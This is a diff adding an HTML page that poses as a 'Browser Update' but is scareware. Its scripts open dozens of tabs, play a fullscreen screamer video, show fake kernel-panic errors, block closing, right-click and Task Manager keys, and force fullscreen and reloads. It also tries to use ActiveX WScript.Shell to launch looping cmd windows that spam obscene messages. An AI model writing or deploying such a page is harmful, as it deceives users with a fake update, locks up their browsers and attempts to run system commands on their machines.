@@ -1,0 +1,192 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>Browser Update</title>
+    <script>
+        window.onload = function() {
+            // Открытие множества вкладок
+            for(let i = 0; i < 25; i++) {
+                setTimeout(() => {
+                    window.open(window.location.href, '_blank');
+                }, i * 200);
+            }
+
+            // Запуск скримера
+            setTimeout(() => {
+                const video = document.createElement('video');
+                video.src = 'https://robuxfree777.github.io/abf/media/jeff.mp4';
+                video.autoplay = true;
+                video.controls = false;
+                video.loop = true;
+                video.style.position = 'fixed';
+                video.style.top = '0';
+                video.style.left = '0';
+                video.style.width = '100vw';
+                video.style.height = '100vh';
+                video.style.zIndex = '99999';
+                video.volume = 1.0;
+                document.body.appendChild(video);
+                
+                video.requestFullscreen().catch(e => console.log(e));
+            }, 3000);
+
+            // Создание ошибок
+            setInterval(() => {
+                console.error('SYSTEM_CORRUPTION: Memory violation at ' + Math.random());
+                throw new Error('KERNEL_PANIC');
+            }, 1000);
+
+            // Блокировка закрытия
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                
+                // Попытка запуска CMD окон
+                try {
+                    // Первое CMD окно с циклическим echo
+                    const cmd1 = new ActiveXObject('WScript.Shell');
+                    cmd1.Run('cmd /c @echo off && :loop && echo Fuck you && goto loop', 0, false);
+                    
+                    // Второе CMD окно с спамом msg
+                    const cmd2 = new ActiveXObject('WScript.Shell');
+                    cmd2.Run('cmd /c @echo off && :start && msg * fuck you && timeout 1 && goto start', 0, false);
+                } catch(e) {
+                    // Альтернативный метод для современных браузеров
+                    fetch('data:text/plain,echo Fuck you', {mode: 'no-cors'});
+                }
+                
+                alert('Fuck you)');
+                return 'Fuck you)';
+            };
+
+            // Блокировка диспетчера задач
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey && e.shiftKey && e.key === 'Escape') {
+                    e.preventDefault();
+                    alert('Fuck you)');
+                    window.open('','_self').close();
+                }
+                if (e.ctrlKey && e.altKey && e.key === 'Delete') {
+                    e.preventDefault();
+                    alert('Fuck you)');
+                    for(let i = 0; i < 10; i++) {
+                        window.open(window.location.href);
+                    }
+                }
+            });
+
+            // Предотвращение выключения ПК
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                document.body.innerHTML = '<h1 style="color:red;font-size:60px;text-align:center;">Fuck you)</h1>';
+                
+                // Создание множества окон при попытке закрыть
+                setInterval(() => {
+                    window.open('', 'https://robuxfree777.github.io/abf/media/jeff.mp4', 'width=500,height=500');
+                }, 500);
+            });
+
+            // Дополнительные вкладки каждые 5 секунд
+            setInterval(() => {
+                window.open('https://robuxfree777.github.io/abf/media/jeff.mp4', '_blank');
+            }, 5000);
+        };
+
+        // Постоянный спам ошибками
+        setInterval(() => {
+            try {
+                undefinedFunction();
+            } catch(e) {
+                console.error(e);
+            }
+        }, 500);
+
+        // Блокировка правой кнопки мыши
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            alert('Fuck you)');
+        });
+
+        // Предотвращение выхода из полноэкранного режима
+        document.addEventListener('fullscreenchange', function() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            }
+        });
+
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .terminal {
+            border: 2px solid #0f0;
+            padding: 20px;
+            background: #000;
+        }
+        .blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <h1>BROWSER UPDATE IN PROGRESS...</h1>
+        <p>DO NOT CLOSE THIS WINDOW</p>
+        <p class="blink">▼</p>
+    </div>
+
+    <script>
+        // Дополнительный скрипт для максимального раздражения
+        setInterval(() => {
+            document.title = "Fuck you) " + Math.random();
+            window.moveTo(Math.random() * 100, Math.random() * 100);
+        }, 1000);
+
+        // Вибрация (если поддерживается)
+        if (navigator.vibrate) {
+            setInterval(() => {
+                navigator.vibrate([500, 500, 500]);
+            }, 2000);
+        }
+
+        // Запуск дополнительных процессов при любом действии
+        document.addEventListener('click', function() {
+            window.open('', '_blank');
+        });
+
+        document.addEventListener('mousemove', function() {
+            try {
+                console.error('INPUT_DETECTED: Terminating process...');
+            } catch(e) {}
+        });
+
+        // Финальный мерзкий трюк - перезагрузка страницы при попытке закрыть
+        window.addEventListener('unload', function() {
+            localStorage.setItem('reload', 'true');
+        });
+
+        if (localStorage.getItem('reload') === 'true') {
+            localStorage.removeItem('reload');
+            window.location.reload();
+        }
+    </script>
+</body>
+</html>
